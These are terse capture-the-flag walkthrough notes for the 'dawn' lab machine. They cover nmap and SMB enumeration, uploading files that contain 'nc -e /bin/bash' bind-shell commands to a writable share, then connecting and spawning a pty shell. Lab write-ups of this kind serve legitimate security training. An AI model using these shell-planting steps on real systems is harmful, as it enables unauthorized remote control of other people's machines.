----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# dawn
# 4/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1

dirb http://192.168.54.11/

http://192.168.54.11/logs
enum4linux 192.168.54.11
smbclient //192.168.54.11/ITDEPT

echo "nc -e /bin/bash -lvp 1234 &" > product-control
echo "nc -e /bin/bash -lvp 1235 &" > web-control
ls


put product-control
put web-control
ls

nc 192.168.54.11 1234
python -c 'import pty;pty.spawn("/bin/bash")'
